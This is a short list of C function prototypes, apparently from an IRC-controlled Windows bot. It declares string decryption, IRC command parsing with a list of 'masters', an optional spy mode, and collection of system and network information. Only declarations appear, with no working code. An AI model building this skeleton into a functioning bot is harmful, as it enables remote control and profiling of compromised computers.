 char * decryptstr(char *str, int strlen);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 DWORD WINAPI irc_connect(LPVOID param);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat);
 #ifndef NO_SPY
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server);
 #endif
 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
 char * replacestr(char *str, char *oldstr, char *newstr);



 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo);
 int cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif